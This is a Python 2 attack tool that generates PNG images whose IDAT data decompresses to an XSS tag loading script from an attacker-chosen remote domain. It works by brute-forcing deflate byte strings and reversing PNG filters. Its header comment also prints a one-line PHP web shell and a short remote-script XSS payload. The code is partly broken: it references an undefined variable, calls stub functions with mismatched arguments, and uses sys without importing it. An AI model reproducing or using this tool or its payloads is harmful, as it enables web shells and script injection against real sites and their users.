#!/usr/bin/python
'''
Author: Hunter Gregal
Based off of code and concepts:
	Adam Logue -- https://www.adamlogue.com/revisiting-xss-payloads-in-png-idat-chunks
	IDontPlayDarts -- https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks
	fin1te -- https://whitton.io/articles/xss-on-facebook-via-png-content-types
	Vavkamil -- https://github.com/vavkamil/PNG-IDAT-chunks
Payloads:
	WebShell: <?=$_GET[0]($_POST[1]);?>
	XSS:	Varies alot. Easier with short remote include -- aka <SCRIPT src=//LOG.BZ><script>
'''
from threading import Thread
from math import floor
from PIL import Image
import argparse
import zlib, os, time
import binascii
import struct
#args
parser = argparse.ArgumentParser(description="Tool to generate PNG-IDAT Payloads.")
parser.add_argument('-r', '--remote-domain', dest='remoteDomain', help='Remote domain to retrieve payload from (shorter the better: ex. xx.xxx)', required=True, type=str)
parser.add_argument('-o', '--output-file', dest='outputImage', help='Output payload to PNG file', required=True, type=str)
args = parser.parse_args()

def gzdeflate(string):
	deflated = zlib.compress(string)[2:-4]
	return deflated

def hex2bin(hexstr):
	#binstr = hexstr.decode('hex')
	#print hexstr
	try:
		#binstr = binascii.unhexlify(hexstr)
		binstr = hexstr.decode('hex')
	except TypeError:
		return 'ff'
	return binstr

def bin2hex(binstr):
	hexstr = binstr.encode('hex')
	return hexstr

def calcKeyspace(dynamicPayload):
	i=0
	end ='0x'
	start = '0x'
	while i <= len(dynamicPayload):
		start += '11'
		end += 'ff'
		i += 1
	end = int(end,16)
	start = int(start,16)
	keyspace = end-start
	print "[-]Calculated Dynamic Keyspace:",str(keyspace)
	return start, end, keyspace

def remoteDomainParse(remoteDomain):
	prefix = '.'.join(remoteDomain.split(".")[:-1])
	tld = ''.join(remoteDomain.split(".")[-1:])
	return prefix,tld

def calcBruteMethod(remoteDomain, prefix, tld):
	#Payload
	targetPayload = "<SCRIPT SRC=//"+remoteDomain+"></SCRIPT>"
	#start,end,keyspace = calcKeyspace(remoteDomain)
	print "[+]PAYLOAD:"
	print "[-]Target Payload:", targetPayload
	
	if tld == "BZ":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = aLouge(targetPayload, prefix)
		return gzdeflatePayload
	elif tld == "PE":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = fin1te(targetPayload, prefix)
		return gzdeflatePayload
	elif tld == "CZ":
		print "[+]Known tld detected, trying fast method!"
		gzdeflatePayload = vavkamil(targetPayload, prefix)
		return gzdeflatePayload
	else:
		print "[+] Unknown tld, attempting slow method"
		gzdeflatePayload = vakamilBrute(targetPayload, prefix, tld)
		return gzdeflatePayload

def fin1te(remoteDomain, prefix, tld):
	#todo
	return
def aLouge(targetPayload, prefix):
	#Calculate keyspace
	start = 0x11
	end = 0xffffff
	keyspace = end-start
	print "[-]Calculated Keyspace: %s" % str(keyspace)
	raw_input("[*]Press Any Key to Begin Bruteforce")

	#BruteForce	
	print "[+]Starting Gzdeflate Payload Bruteforce..."
	i=1
	while start < end:
		if i % 100000 == 0:
			print "[-]Guess: %s/%s -- Left: %s" % (i,keyspace,keyspace-i)
		#brute = hex(start).encode('ascii')[2:]
		brute = hex(start)[2:]
		if "L" in brute:
			brute = brute[:-1]
		guess = 'f399281922111510691928276e6e'+brute+'1e581b1f576e69b16375535b6f0e7f'
		#guess = 'f399281922111510691928276e6e6020201e581b1f576e69b16375535b6f0e7f'
		deflate = gzdeflate(hex2bin(guess))
		
		if targetPayload.upper() in deflate.upper():
			print "[!]GZDEFLATE PAYLOAD FOUND!"
			print "Gzdeflate Payload String: %s" % repr(deflate)
			print "Gzdeflate Payload: %s" % guess
			return guess
		start += 1
		i+=1
	return False

def vavkamil(remoteDomain, prefix, tld):
	#todo
	return
'''
def gzdeflateBrute(start, end, keyspace, targetPayload, prefix, tld):
	#BruteForce	
	print "[+]Starting Gzdeflate Payload Bruteforce..."
	i=1
	while start < end:
		if i % 500000 == 0:
			print "[-]Guess:",str(i)+"/"+str(keyspace), "--", "Left:",str(keyspace-i)
		brute = hex(start).encode('ascii')[2:]
		if "L" in brute:
			brute = brute[:-1]
		guess = '7ff399281922111510691928276e6e'+brute+'576e69b16375535b6f'
		deflate = gzdeflate(hex2bin(guess))
		
		#DEBUG
		##guess = 'f399281922111510691928276e6e562e2c1e581b1f576e69b16375535b6f0e7f'
		##print targetPayload.upper()
		##print deflate.upper()
		if targetPayload.upper() in deflate.upper():
			print "[!]GZDEFLATE PAYLOAD FOUND!"
			print "Gzdeflate Payload String: %s" % repr(deflate)
			print "Gzdeflate Payload: %s" % guess
			break
		else:
			start += 1
			i += 1
'''
def filterBypass(gzdeflatePayload):
	print "[+]Crafting payload to bypass PNG filters..."
	payload=[]
	#Convert hex string into hex lists
	pList = [gzdeflatePayload[i:i+2] for i in range(0,len(gzdeflatePayload), 2)]
	hPlist1 = [int(('0x'+i),16) for i in pList]
	hPlist2 = []

	#reverse filter 1
	i=0
	while i < (len(hPlist1)-3):
		hPlist1[i+3] = (hPlist1[i+3] + hPlist1[i]) % 256
		i+=1
	for filter1 in hPlist1:
		hPlist2.append(filter1)

	#reverse filter 3
	i = 0
	while i < (len(hPlist2)-3):
		hPlist2[i+3] = (hPlist2[i+3] + floor(hPlist2[i] / 2)) % 256
		i += 1
	for filter3 in hPlist2:
		payload.append(filter3)
	print "[+]Filter-Proof Payload Crafted!"
	#print "Filter-Proof Payload: %s" % payload
	return payload

def generateFinalPayload(payload, outputImage):
	#Thanks to admanLogue and hLk_886 for this PNG Code
	im = Image.new('RGB', (32,32))
	i = 0
	c = 0
	while (i < len(payload)):
		r = payload[i]
		g = payload[i+1]
		b = payload[i+2]
		im.putpixel((c,0), (r,g,b))
		i += 3
		c += 1

	im.save(outputImage)
	print "[!!] COMPLETE [!!]"
	print "[!!] PNG Payload Saved as: %s" % outputImage

if __name__ == '__main__':
	#if PHP webshell do it:
	#else assume xss method
	
	remoteDomain = (args.remoteDomain).upper()
	outputImage = args.outputImage
	prefix,tld = remoteDomainParse(remoteDomain)
	#If Domain larger than 3 chars
	if len(prefix) > 3:
		print "Domains larger than 3 chars not supported yet!"
	#Check possible bruteforce methods
	else:
		method = calcBruteMethod(remoteDomain, prefix, tld)
	#If failed, quit
	if not gzdeflatePayload:
		print "[+] Payload Failed to Generate...exiting"
		sys.exit(0)
	#Generate filter-bypass
	payload = filterBypass(gzdeflatePayload)
	#Create Payload PNG
	generateFinalPayload(payload, outputImage)
